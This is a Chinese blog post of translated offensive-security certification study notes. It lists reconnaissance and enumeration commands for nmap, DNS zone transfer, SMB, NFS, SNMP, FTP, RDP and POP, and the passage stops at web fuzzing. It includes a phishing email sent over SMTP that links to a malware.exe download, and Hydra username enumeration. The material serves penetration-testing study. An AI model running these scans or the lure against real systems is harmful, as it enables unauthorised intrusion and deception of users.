

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="笔记说明：该笔记是国外进攻性爱好者 rodolfomarianocy 在 github 上记录的学习笔记，我整体翻译了注释的内容，并根据个人学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:type" content="article">
<meta property="og:title" content="国外某进攻性安全证书-书籍技巧-2023版本">
<meta property="og:url" content="https://sh1yan.top/2024/06/01/Attack-certificate-Book-Skills-2023-rodolfomarianocy/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="笔记说明：该笔记是国外进攻性爱好者 rodolfomarianocy 在 github 上记录的学习笔记，我整体翻译了注释的内容，并根据个人学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-06-01T15:50:55.000Z">
<meta property="article:modified_time" content="2024-06-02T14:38:29.931Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="Offensive security">
<meta property="article:tag" content="Learning Notes">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>国外某进攻性安全证书-书籍技巧-2023版本 - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我的开源工具列表</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/nuclei/" target="_self">
                    
                    <span>Nuclei命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="国外某进攻性安全证书-书籍技巧-2023版本"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-01 23:50" pubdate>
          2024年6月1日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          42k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          355 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">国外某进攻性安全证书-书籍技巧-2023版本</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="笔记说明："><a href="#笔记说明：" class="headerlink" title="笔记说明："></a>笔记说明：</h1><p>该笔记是国外进攻性爱好者 rodolfomarianocy 在 github 上记录的学习笔记，我整体翻译了注释的内容，并根据个人学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。</p>
<span id="more"></span>  

<h1 id="六、侦察-信息收集"><a href="#六、侦察-信息收集" class="headerlink" title="六、侦察-信息收集"></a>六、侦察-信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>nmap</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -sn <span class="hljs-number">10.10</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">16</span><br></code></pre></td></tr></table></figure>
<p><code>https://github.com/andrew-d/static-binaries/tree/master/binaries</code></p>
<p>crackmapexec执行SMB</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.20</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p>Ping 扫描 - PowerShell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ($i=<span class="hljs-number">1</span>;$i -lt <span class="hljs-number">255</span>;$i++) &#123; ping -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span>.$i| findstr <span class="hljs-string">&quot;TTL&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<p>Ping 扫描 - Bash</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> i in &#123;<span class="hljs-number">1.</span><span class="hljs-number">.255</span>&#125;;<span class="hljs-keyword">do</span> (ping -c <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span>.$i | grep <span class="hljs-string">&quot;bytes from&quot;</span> &amp;); done<br></code></pre></td></tr></table></figure>

<p>端口扫描 - Bash</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> i in &#123;<span class="hljs-number">1.</span><span class="hljs-number">.65535</span>&#125;; <span class="hljs-keyword">do</span> (echo &gt; /dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>/$i) &gt;/dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;&amp; echo $i is open; done<br></code></pre></td></tr></table></figure>

<p>端口扫描 - NetCat</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nc -zvn &lt;ip&gt; <span class="hljs-number">1</span><span class="hljs-number">-1000</span><br></code></pre></td></tr></table></figure>

<p><code>https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat</code></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -sC -sV -A -Pn -T5 -p- &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<h3 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h3><p>rustscan安装</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo docker pull rustscan/rustscan:<span class="hljs-number">2.1</span><span class="hljs-number">.1</span><br>alias rustscan=<span class="hljs-string">&#x27;sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1&#x27;</span><br></code></pre></td></tr></table></figure>

<p>rustscan扫描</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rustscan -a &lt;ip&gt; -- -A -Pn<br></code></pre></td></tr></table></figure>

<h2 id="DNS枚举"><a href="#DNS枚举" class="headerlink" title="DNS枚举"></a>DNS枚举</h2><p>查找域的主机记录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">host &lt;domain&gt;<br>host -t mx megacorpone.com<br>host -t txt &lt;domain&gt;<br></code></pre></td></tr></table></figure>

<p>正向查找暴力破解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ip in $(cat wordlist.txt); <span class="hljs-keyword">do</span> host $ip.&lt;domain&gt;; done<br></code></pre></td></tr></table></figure>

<p>反向查找暴力破解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ip in $(seq  <span class="hljs-number">50</span> <span class="hljs-number">100</span>); <span class="hljs-keyword">do</span> host <span class="hljs-number">192.168</span><span class="hljs-number">.0</span>.$ip; done | grep -v <span class="hljs-string">&quot;not found&quot;</span><br></code></pre></td></tr></table></figure>

<p>获取给定域的 DNS 服务器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">host -t ns megacorpone.com | cut -d <span class="hljs-string">&quot; &quot;</span> -f <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>

<p>DNS 区域传输</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">host -l &lt;domain name&gt; &lt;dns server address&gt;<br></code></pre></td></tr></table></figure>

<p>DNS 区域传输 - dnsrecon</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">dnsrecon -d &lt;domain -t axfr<br>dnsrecon -d megacorpone.com -D wordlist.txt -t brt<br></code></pre></td></tr></table></figure>

<h2 id="中小企业服务枚举"><a href="#中小企业服务枚举" class="headerlink" title="中小企业服务枚举"></a>中小企业服务枚举</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -v -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> -oG smb.txt <span class="hljs-number">10.11</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">-254</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nbtscan -r <span class="hljs-number">10.11</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p>枚举4Linux</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">enum4linux &lt;ip&gt;<br>enum4linux -a -u <span class="hljs-string">&quot;&quot;</span> -p <span class="hljs-string">&quot;&quot;</span> &lt;ip&gt; &amp;&amp; enum4linux -a -u <span class="hljs-string">&quot;guest&quot;</span> -p <span class="hljs-string">&quot;&quot;</span> &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<h2 id="NFS-枚举"><a href="#NFS-枚举" class="headerlink" title="NFS 枚举"></a>NFS 枚举</h2><p>查看 nfs 版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -sV -p <span class="hljs-number">111</span> --script=rpcinfo <span class="hljs-number">10.11</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">-254</span><br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rpcinfo &lt;IP&gt; | grep nfs<br></code></pre></td></tr></table></figure>

<p>查看NFS共享目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -p <span class="hljs-number">111</span> --script nfs* &lt;IP&gt;<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">showmount -e &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<p>挂载</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">mkdir /tmp/ok<br>sudo mount -t nfs -o vers=<span class="hljs-number">4</span> &lt;IP&gt;:/folder /tmp/ok -o nolock<br></code></pre></td></tr></table></figure>

<p>配置文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">/etc/exports<br>/etc/lib/nfs/etab<br></code></pre></td></tr></table></figure>

<h2 id="LDAP-枚举"><a href="#LDAP-枚举" class="headerlink" title="LDAP 枚举"></a>LDAP 枚举</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -n -sV --script <span class="hljs-string">&quot;ldap* and not brute&quot;</span> &lt;IP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="SNMP-枚举"><a href="#SNMP-枚举" class="headerlink" title="SNMP 枚举"></a>SNMP 枚举</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nmap -sU --open -p <span class="hljs-number">161</span> <span class="hljs-number">10.11</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">-254</span> -oG open-snmp.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">echo public &gt; community<br>echo private &gt;&gt; community<br>echo manager &gt;&gt; community<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ip in $(seq <span class="hljs-number">1</span> <span class="hljs-number">243</span>); <span class="hljs-keyword">do</span> echo <span class="hljs-number">192.168</span><span class="hljs-number">.0</span>.$ip; done &gt; ips<br>onesixtyone -c community -i ips<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">onesixtyone -c community -i ips<br></code></pre></td></tr></table></figure>

<p>枚举整个MIB树</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">snmpwalk -c public -v1  &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<p>枚举Windows用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">snmpwalk -c public -v1 &lt;ip&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.77</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.25</span><br></code></pre></td></tr></table></figure>

<p>列出正在运行的进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">snmpwalk -c public -v1 &lt;ip&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span><span class="hljs-number">.4</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure>

<p>列出开放的 TCP 端口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">snmpwalk -c public -v1 &lt;ip&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.6</span><span class="hljs-number">.13</span><span class="hljs-number">.1</span><span class="hljs-number">.3</span><br></code></pre></td></tr></table></figure>

<p>枚举已安装的软件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">snmpwalk -c public -v1 &lt;ip&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span><span class="hljs-number">.6</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure>

<h2 id="文件传输协议"><a href="#文件传输协议" class="headerlink" title="文件传输协议"></a>文件传输协议</h2><p>-&gt; 凭据默认<br>anonymous：anonymous<br>-&gt; 获取版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nc &lt;IP&gt; &lt;PORT&gt;<br></code></pre></td></tr></table></figure>

<p>扫描 ftp 服务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap --script ftp-* -p <span class="hljs-number">21</span> &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<p>二进制传输</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ftp user@port<br>binary<br></code></pre></td></tr></table></figure>

<p>ascii 传输</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ftp user@port<br>ascii<br></code></pre></td></tr></table></figure>

<h2 id="远程登录计划"><a href="#远程登录计划" class="headerlink" title="远程登录计划"></a>远程登录计划</h2><p>RDP 枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap --script rdp-ntlm-info,rdp-<span class="hljs-class"><span class="hljs-keyword">enum</span>-<span class="hljs-title">encryption</span>,<span class="hljs-title">rdp</span>-<span class="hljs-title">vuln</span>-<span class="hljs-title">ms12</span>-020 -<span class="hljs-title">p</span> 3389 -<span class="hljs-title">T4</span> &lt;</span>IP&gt;<br></code></pre></td></tr></table></figure>

<p>连接到 RDP</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">rdesktop -u &lt;username&gt; &lt;IP&gt;<br>xfreerdp /d:&lt;domain&gt; /u:&lt;username&gt; /p:&lt;password&gt; /v:&lt;IP&gt;<br></code></pre></td></tr></table></figure>

<p>检查 RDP 中的有效凭据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rdp_check &lt;domain&gt;/&lt;name&gt;:&lt;password&gt;@&lt;IP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="邮箱登录计划"><a href="#邮箱登录计划" class="headerlink" title="邮箱登录计划"></a>邮箱登录计划</h2><p>POP 枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap --script pop3-capabilities,pop3-ntlm-info -sV -port &lt;IP&gt;<br></code></pre></td></tr></table></figure>

<p>登录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">telnet &lt;IP&gt; <span class="hljs-number">110</span><br>USER user1<br>PASS password<br></code></pre></td></tr></table></figure>

<p>列出消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure>

<p>显示消息编号 1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">retr <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h2 id="邮件传输协议"><a href="#邮件传输协议" class="headerlink" title="邮件传输协议"></a>邮件传输协议</h2><p>SMTP 枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -p25 --script smtp-commands,smtp-open-relay <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span><br></code></pre></td></tr></table></figure>

<p>通过 SMTP 发送电子邮件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">nc -C &lt;IP&gt; <span class="hljs-number">25</span><br>HELO<br>MAIL FROM:user@local<br>RCPT TO:user2@local<br>DATA<br>Subject: approved in the job<br><br>http:<span class="hljs-comment">//&lt;IP&gt;/malware.exe</span><br><br>.<br>QUIT<br></code></pre></td></tr></table></figure>

<p><code>Hydra smtp-enum://192.168.0.1/vrfy -l john -p localhost -&gt; 用户名枚举</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">telnet <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">25</span><br>HELO<br>hydra smtp-<span class="hljs-class"><span class="hljs-keyword">enum</span>:</span><span class="hljs-comment">//&lt;IP&gt;/vrfy -L &quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot; </span><br></code></pre></td></tr></table></figure>

<h2 id="网站信息搜集技术"><a href="#网站信息搜集技术" class="headerlink" title="网站信息搜集技术"></a>网站信息搜集技术</h2><h3 id="沃帕利泽-wappalyzer"><a href="#沃帕利泽-wappalyzer" class="headerlink" title="沃帕利泽 - wappalyzer"></a>沃帕利泽 - wappalyzer</h3><p><code>https://www.wappalyzer.com/</code></p>
<h3 id="那个网站是什么"><a href="#那个网站是什么" class="headerlink" title="那个网站是什么"></a>那个网站是什么</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./whatweb site.com<br></code></pre></td></tr></table></figure>

<h3 id="FFUF目录扫描工具"><a href="#FFUF目录扫描工具" class="headerlink" title="FFUF目录扫描工具"></a>FFUF目录扫描工具</h3><p>模糊测试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -u http:<span class="hljs-comment">//site.com/FUZZ -w /usr/share/wordlists/dirb/big.txt</span><br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gobuster dir -u &lt;IP&gt; -w /usr/share/wordlists/dirb/common.txt -t <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>

<p>模糊测试文件扩展名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -u <span class="hljs-string">&quot;https://site.com/indexFUZZ&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -fs xxx<br></code></pre></td></tr></table></figure>

<p>模糊测试参数 GET</p>
